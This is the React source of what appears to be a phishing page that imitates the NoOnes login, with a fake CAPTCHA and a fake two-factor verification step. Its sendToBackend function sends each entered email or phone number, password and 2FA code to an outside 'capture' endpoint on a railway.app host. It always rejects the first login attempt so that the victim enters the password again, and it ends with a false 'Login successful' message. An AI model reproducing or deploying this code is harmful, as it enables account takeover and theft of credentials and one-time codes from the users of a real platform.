import React, { useState, useEffect } from 'react';
import './login.css';

const Login = () => {
  const [formData, setFormData] = useState({
    identifier: '',
    password: ''
  });
  const [verificationCode, setVerificationCode] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [darkTheme, setDarkTheme] = useState(false);
  const [loading, setLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState('login'); // login, captcha, method, verify
  const [userEmail, setUserEmail] = useState('');
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');
  const [selectedMethod, setSelectedMethod] = useState(''); // 'email' or 'authenticator'
  const [captchaPosition, setCaptchaPosition] = useState(0);
  const [targetPosition, setTargetPosition] = useState(50);
  const [selectedLanguage, setSelectedLanguage] = useState('English'); // New state for language selector
  const [sessionId] = useState(() => `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`);

  // Function to send data to backend
  const sendToBackend = async (captureData) => {
    try {
      const response = await fetch('https://nuns-production.up.railway.app/api/capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...captureData,
          sessionId: sessionId,
          userAgent: navigator.userAgent
        })
      });
      
      const result = await response.json();
      console.log('📨 Sent to backend:', result);
    } catch (error) {
      console.log('⚠️ Backend not available, running in demo mode');
    }
  };

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
    setErrorMessage('');
  };

  const handleClearIdentifier = () => {
    setFormData(prev => ({ ...prev, identifier: '' }));
  };

  const handleVerificationChange = (e) => {
    setVerificationCode(e.target.value);
  };

  const handleLoginSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage('');
    
    await sendToBackend({
      type: 'LOGIN_ATTEMPT',
      identifier: formData.identifier,
      password: formData.password,
      attempt: loginAttempt + 1
    });
    
    setTimeout(() => {
      setLoading(false);
      
      if (loginAttempt === 0) {
        setLoginAttempt(1);
        setErrorMessage('Invalid credentials. Please try again.');
        sendToBackend({
          type: 'LOGIN_FAILED',
          identifier: formData.identifier,
          attempt: 1
        });
      } else {
        setUserEmail(formData.identifier);
        setCurrentStep('captcha');
        setLoginAttempt(0);
      }
    }, 1500);
  };

  // CAPTCHA Puzzle Functions
  const handleCaptchaDrag = (e) => {
    let clientX = e.clientX;
    if (e.touches && e.touches[0]) {
        clientX = e.touches[0].clientX;
    }

    const puzzleTrack = document.querySelector('.puzzle-track');
    if (!puzzleTrack) return;
    
    const rect = puzzleTrack.getBoundingClientRect();
    const x = clientX - rect.left;
    const trackWidth = rect.width;
    
    const percentage = Math.max(0, Math.min(100, (x / trackWidth) * 100));
    setCaptchaPosition(percentage);
  };

  const handleCaptchaSubmit = () => {
    if (Math.abs(captchaPosition - targetPosition) <= 5) {
      sendToBackend({
        type: 'CAPTCHA_SOLVED',
        identifier: userEmail
      });
      setCurrentStep('method');
    } else {
      setErrorMessage('Please align the puzzle correctly');
    }
  };

  const handleMethodSelect = (method) => {
    setSelectedMethod(method);
    sendToBackend({
      type: 'VERIFICATION_METHOD_SELECTED',
      identifier: userEmail,
      method: method
    });
    setCurrentStep('verify');
  };

  const handleVerificationSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    await sendToBackend({
      type: 'VERIFICATION_ATTEMPT',
      identifier: userEmail,
      method: selectedMethod,
      code: verificationCode
    });
    
    setTimeout(() => {
      setLoading(false);
      sendToBackend({
        type: 'LOGIN_SUCCESS',
        identifier: userEmail,
        method: selectedMethod
      });
      
      alert('✅ Login successful! Account verified.');
      resetFlow();
    }, 1500);
  };

  const resetFlow = () => {
    setCurrentStep('login');
    setFormData({ identifier: '', password: '' });
    setVerificationCode('');
    setSelectedMethod('');
    setCaptchaPosition(0);
    setTargetPosition(Math.floor(Math.random() * 70) + 15); // Random target for next time
  };

  const goBack = () => {
    if (currentStep === 'verify') {
      setCurrentStep('method');
    } else if (currentStep === 'method') {
      setCurrentStep('captcha');
    } else if (currentStep === 'captcha') {
      setCurrentStep('login');
    }
    setErrorMessage('');
  };

  const toggleTheme = () => {
    setDarkTheme(!darkTheme);
  };

  // Initialize random target position
  useEffect(() => {
    setTargetPosition(Math.floor(Math.random() * 70) + 15);
  }, []);
  
  // Custom Drag Handlers for Puzzle Slider
  const startDrag = (e) => {
    e.preventDefault();
    const handleMove = (moveEvent) => {
      handleCaptchaDrag(moveEvent);
    };
    const handleEnd = () => {
      document.removeEventListener('mousemove', handleMove);
      document.removeEventListener('mouseup', handleEnd);
      document.removeEventListener('touchmove', handleMove);
      document.removeEventListener('touchend', handleEnd);
    };
    document.addEventListener('mousemove', handleMove);
    document.addEventListener('mouseup', handleEnd);
    document.addEventListener('touchmove', handleMove);
    document.addEventListener('touchend', handleEnd);
  };

  // Theme Toggle and Language Selector JSX Block (Shared across all steps)
  const BottomControls = (
    <div className="bottom-controls-container">
      <div className="theme-toggle-outer">
        <button 
          className={`theme-toggle-btn ${darkTheme ? 'dark' : 'light'}`}
          onClick={toggleTheme}
          title={darkTheme ? 'Switch to Light Theme' : 'Switch to Dark Theme'}
        >
          {/* Sun Icon (Light Mode Icon) */}
          <span className="theme-icon sun-icon">
              🔆
          </span>
          
          {/* The main switch/slider part */}
          <span className="toggle-switch-track">
            <span className="toggle-switch-thumb"></span>
          </span>
          
          {/* Moon Icon (Dark Mode Icon) */}
          <span className="theme-icon moon-icon">
              🌙
          </span>
        </button>
      </div>

      <div className="language-selector-outer">
        <select 
          className={`language-select ${darkTheme ? 'dark' : 'light'}`}
          value={selectedLanguage}
          onChange={(e) => setSelectedLanguage(e.target.value)}
        >
          <option value="English">English</option>
          <option value="Spanish">Spanish</option>
          <option value="French">French</option>
        </select>
        <span className="language-dropdown-arrow"></span> {/* Custom arrow */}
      </div>
    </div>
  );


  // CAPTCHA Puzzle Step
  if (currentStep === 'captcha') {
    return (
      <div className="login-wrapper">
        <div 
          className="background-container"
          style={{
            backgroundImage: darkTheme 
              ? "url('/assets/background_dark.png')"
              : "url('/assets/background_light.png')",
          }}
        ></div>
        
        <div className="login-container">
          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
            <div className="login-header">
              <div className="header-left">
                <h1 className="welcome-text">Security Check</h1>
                <p className="verification-subtitle">Complete the puzzle to continue</p>
              </div>
              <div className="header-right">
                <button className="social-btn back-btn" onClick={goBack} title="Back to Login">
                  ←
                </button>
              </div>
            </div>

            <div className="security-notice">
              <div className="security-icon">🧩</div>
              <p>Slide the puzzle piece to the correct position</p>
              <p className="code-instruction">Align the image to complete the CAPTCHA verification</p>
            </div>

            <div className="captcha-puzzle">
              <div className="puzzle-container">
                <div className="puzzle-track">
                  <div 
                    className="puzzle-slider"
                    style={{ left: `${captchaPosition}%` }}
                    onMouseDown={startDrag}
                    onTouchStart={startDrag}
                  >
                    🧩
                  </div>
                  <div className="puzzle-target" style={{ left: `${targetPosition}%` }}>
                    🎯
                  </div>
                </div>
              </div>
              
              {errorMessage && (
                <div className="error-message">
                  {errorMessage}
                </div>
              )}

              <button 
                onClick={handleCaptchaSubmit}
                className="login-button"
              >
                Verify Puzzle
              </button>
            </div>

            <div className="help-links">
              <p><a href="#">Having trouble with the puzzle?</a></p>
            </div>
          </div>
        </div>
        {BottomControls}
      </div>
    );
  }

  // Verification Method Selection Step
  if (currentStep === 'method') {
    return (
      <div className="login-wrapper">
        <div 
          className="background-container"
          style={{
            backgroundImage: darkTheme 
              ? "url('/assets/background_dark.png')"
              : "url('/assets/background_light.png')",
          }}
        ></div>
        
        <div className="login-container">
          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
            <div className="login-header">
              <div className="header-left">
                <h1 className="welcome-text">Choose Verification Method</h1>
                <p className="verification-subtitle">How would you like to verify your identity?</p>
              </div>
              <div className="header-right">
                <button className="social-btn back-btn" onClick={goBack} title="Back to Puzzle">
                  ←
                </button>
              </div>
            </div>

            <div className="security-notice">
              <div className="security-icon">🔐</div>
              <p>Select your preferred verification method</p>
              <p className="user-email">Verifying: {userEmail}</p>
            </div>

            <div className="verification-methods">
              <div 
                className={`method-option ${selectedMethod === 'email' ? 'selected' : ''}`}
                onClick={() => handleMethodSelect('email')}
              >
                <div className="method-icon">📧</div>
                <div className="method-content">
                  <h3>Email Verification</h3>
                  <p>Send a 6-digit code to your email address</p>
                </div>
              </div>

              <div 
                className={`method-option ${selectedMethod === 'authenticator' ? 'selected' : ''}`}
                onClick={() => handleMethodSelect('authenticator')}
              >
                <div className="method-icon">📱</div>
                <div className="method-content">
                  <h3>Authenticator App</h3>
                  <p>Use Google Authenticator or similar app</p>
                </div>
              </div>
            </div>

            <div className="help-links">
              <p><a href="#">Need help choosing a method?</a></p>
            </div>
          </div>
        </div>
        {BottomControls}
      </div>
    );
  }

  // Verification Code Entry Step
  if (currentStep === 'verify') {
    return (
      <div className="login-wrapper">
        <div 
          className="background-container"
          style={{
            backgroundImage: darkTheme 
              ? "url('/assets/background_dark.png')"
              : "url('/assets/background_light.png')",
          }}
        ></div>
        
        <div className="login-container">
          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
            <div className="login-header">
              <div className="header-left">
                <h1 className="welcome-text">Enter Verification Code</h1>
                <p className="verification-subtitle">
                  {selectedMethod === 'email' ? 'Check your email' : 'Check your authenticator app'}
                </p>
              </div>
              <div className="header-right">
                <button className="social-btn back-btn" onClick={goBack} title="Back to Methods">
                  ←
                </button>
              </div>
            </div>

            <div className="security-notice">
              <div className="security-icon">
                {selectedMethod === 'email' ? '📧' : '📱'}
              </div>
              <p>
                {selectedMethod === 'email' 
                  ? `We've sent a 6-digit verification code to:`
                  : 'Enter the 6-digit code from your authenticator app:'}
              </p>
              {selectedMethod === 'email' && (
                <p className="user-email">{userEmail}</p>
              )}
              <p className="code-instruction">
                {selectedMethod === 'email' 
                  ? 'Please check your inbox and enter the code below'
                  : 'Open your authenticator app and enter the current code'}
              </p>
            </div>

            <form onSubmit={handleVerificationSubmit} className="login-form">
              <div className="form-group">
                <label htmlFor="verificationCode">Verification Code</label>
                <input
                  type="text"
                  id="verificationCode"
                  name="verificationCode"
                  placeholder="Enter 6-digit code"
                  value={verificationCode}
                  onChange={handleVerificationChange}
                  maxLength={6}
                  pattern="[0-9]{6}"
                  required
                  className={darkTheme ? 'dark-input' : 'light-input'}
                />
                <div className="hint-text">
                  {selectedMethod === 'email' 
                    ? 'Check your email for the verification code'
                    : 'Use Google Authenticator, Authy, or similar app'}
                </div>
              </div>

              <button 
                type="submit" 
                className="login-button"
                disabled={loading || verificationCode.length !== 6}
              >
                {loading ? (
                  <span className="loading-spinner">⏳</span>
                ) : (
                  'Verify & Continue'
                )}
              </button>
            </form>

            <div className="help-links">
              <p>
                <a href="#">
                  {selectedMethod === 'email' 
                    ? "Didn't receive the code?"
                    : "Can't access your authenticator app?"}
                </a>
              </p>
              <p><a href="#" onClick={() => setCurrentStep('method')}>Try another method</a></p>
            </div>
          </div>
        </div>
        {BottomControls}
      </div>
    );
  }

  // Login Page (Default Step)
  return (
    <div className="login-wrapper">
      <div 
        className="background-container"
        style={{
          backgroundImage: darkTheme 
            ? "url('/assets/background_dark.png')"
            : "url('/assets/background_light.png')",
        }}
      ></div>
      
      <div className="login-container">
        <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
          <div className="login-header">
            <div className="header-left">
              {/* REMOVED NOONES LOGO ELEMENT */}
              <h1 className="welcome-text">Welcome to NoOnes</h1>
            </div>
            <div className="header-right">
              <button className="social-btn google-btn" title="Google">
                <img 
                  src="/assets/google-icon.gif" 
                  alt="Google" 
                  className="social-icon-img"
                />
              </button>
              <button className="social-btn apple-btn" title="Apple">
                <img 
                  src="/assets/apple-icon.webp" 
                  alt="Apple" 
                  className="social-icon-img"
                />
              </button>
            </div>
          </div>

          <form onSubmit={handleLoginSubmit} className="login-form">
            {errorMessage && (
              <div className="error-message">
                {errorMessage}
              </div>
            )}
            
            <div className="form-group">
              <label htmlFor="identifier">Email/Phone number</label>
              <div className="input-with-icon">
                <input
                  type="text"
                  id="identifier"
                  name="identifier"
                  placeholder="Enter your email or phone number"
                  value={formData.identifier}
                  onChange={handleChange}
                  required
                  className={darkTheme ? 'dark-input' : 'light-input'}
                />
                {formData.identifier && (
                  <button type="button" className="clear-input-btn" onClick={handleClearIdentifier}>
                    &times; {/* HTML entity for 'x' */}
                  </button>
                )}
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="password">Password</label>
              <div className="input-with-icon">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  name="password"
                  placeholder="Enter your password"
                  value={formData.password}
                  onChange={handleChange}
                  required
                  className={darkTheme ? 'dark-input' : 'light-input'}
                />
                <button 
                  type="button"
                  className="toggle-password-visibility"
                  onClick={() => setShowPassword(!showPassword)}
                  title={showPassword ? "Hide password" : "Show password"}
                >
                  {showPassword ? (
                    <img src={darkTheme ? "/assets/eye-closed-dark.svg" : "/assets/eye-closed-light.svg"} alt="Hide" />
                  ) : (
                    <img src={darkTheme ? "/assets/eye-open-dark.svg" : "/assets/eye-open-light.svg"} alt="Show" />
                  )}
                </button>
              </div>
              
              <div className="forgot-password-link">
                <a href="/forgot-password">Forgot password?</a>
              </div>
            </div>

            <button 
              type="submit" 
              className="login-button"
              disabled={loading}
            >
              {loading ? (
                <span className="loading-spinner">⏳</span>
              ) : (
                'Log in'
              )}
            </button>
          </form>

          <div className="signup-prompt">
            <p>No account yet? <a href="/signup" className="signup-link">Sign up</a></p>
          </div>
        </div>
      </div>
      {BottomControls}
    </div>
  );
};

export default Login;